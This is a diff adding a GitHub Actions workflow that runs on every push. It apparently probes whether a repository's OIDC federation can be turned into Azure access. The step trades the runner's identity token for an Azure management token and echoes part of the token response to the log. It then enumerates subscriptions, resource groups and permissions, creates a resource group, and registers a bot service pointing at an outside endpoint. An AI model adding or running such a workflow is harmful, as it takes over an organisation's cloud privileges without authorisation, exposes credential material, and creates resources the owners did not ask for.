@@ -1,0 +1,31 @@
+name: zz-i094-bot
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: arm probe
+        run: |
+          set +e
+          OIDC=$(curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          FED=$(python3 -c 'import json,sys;print(json.loads(sys.argv[1]).get("value",""))' "$OIDC")
+          echo "oidc_len=${#FED}"
+          RESP=$(curl -sS -m 30 -w '\nHTTP:%{http_code}' "https://login.microsoftonline.com/558506eb-9459-4ef3-b920-ad55c555e729/oauth2/v2.0/token" \
+            -d "client_id=53b6a80d-7008-4191-a181-12299d354cff" -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            -d "client_assertion=$FED" -d "scope=https://management.azure.com/.default")
+          echo "TOKENRESP_TAIL=$(echo "$RESP" | tail -c 200)"
+          TOK=$(echo "$RESP" | python3 -c 'import sys,json;d=sys.stdin.read();i=d.rfind("HTTP:");print(json.loads(d[:i]).get("access_token",""))' 2>/dev/null)
+          echo "tok_len=${#TOK}"
+          echo "== SUBS"; curl -sS -m 30 -w '\nHTTP:%{http_code}\n' -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions?api-version=2022-12-01"
+          echo "== RGS"; curl -sS -m 30 -w '\nHTTP:%{http_code}\n' -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/1ee6a30c-7308-4dc8-babf-6b6bd7839bf8/resourceGroups?api-version=2021-04-01"
+          echo "== PERMS"; curl -sS -m 30 -w '\nHTTP:%{http_code}\n' -H "Authorization: Bearer $TOK" "https://management.azure.com/subscriptions/1ee6a30c-7308-4dc8-babf-6b6bd7839bf8/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+          echo "== CREATE RG"; curl -sS -m 30 -X PUT -w '\nHTTP:%{http_code}\n' -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d '{"location":"westus2"}' "https://management.azure.com/subscriptions/1ee6a30c-7308-4dc8-babf-6b6bd7839bf8/resourceGroups/rg-cairn-i094?api-version=2021-04-01"
+          echo "== CREATE BOT"; curl -sS -m 40 -X PUT -w '\nHTTP:%{http_code}\n' -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d '{"location":"global","sku":{"name":"F0"},"kind":"azurebot","properties":{"displayName":"cairni094","endpoint":"https://i050cap36e2cb.azurewebsites.net/api/messages","msaAppId":"40926e8d-3387-4b1d-bc36-6a4d181e50a2","msaAppType":"SingleTenant","msaAppTenantId":"72f988bf-86f1-41af-91ab-2d7cd011db47"}}' "https://management.azure.com/subscriptions/1ee6a30c-7308-4dc8-babf-6b6bd7839bf8/resourceGroups/rg-cairn-i094/providers/Microsoft.BotService/botServices/cairni094?api-version=2022-09-15"
+          echo "DONE"
